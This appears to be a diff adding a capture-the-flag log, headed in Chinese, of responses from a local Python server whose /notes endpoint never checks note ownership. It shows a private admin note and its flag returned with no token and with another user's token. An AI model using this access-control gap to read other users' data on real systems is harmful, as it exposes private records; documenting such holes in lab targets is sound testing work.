@@ -1,0 +1,23 @@
+== IDOR: /notes 不校验 uid 与 note id 的归属 ==
+--- A) 无 token 直接读 id=2 (admin/bob 的私有 note)
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.6 Python/3.13.8
+Date: Wed, 23 Sep 2026 16:43:52 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 68
+
+{"id": "2", "note": "admin-secret-FLAG{idor_user2}", "viewer": null}
+--- B) 带普通用户 uid=1 token 读 id=2，viewer=1 证明服务端收到身份仍未拦截
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.6 Python/3.13.8
+Date: Wed, 23 Sep 2026 16:43:52 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 67
+
+{"id": "2", "note": "admin-secret-FLAG{idor_user2}", "viewer": "1"}
+--- C) 正常本人读 id=1
+{"id": "1", "note": "alice-note", "viewer": null}
+--- D) 不存在的 id
+{"error": "no note"}
+{"error": "no note"}
+== 第二个 flag 出现在 note 正文 ==
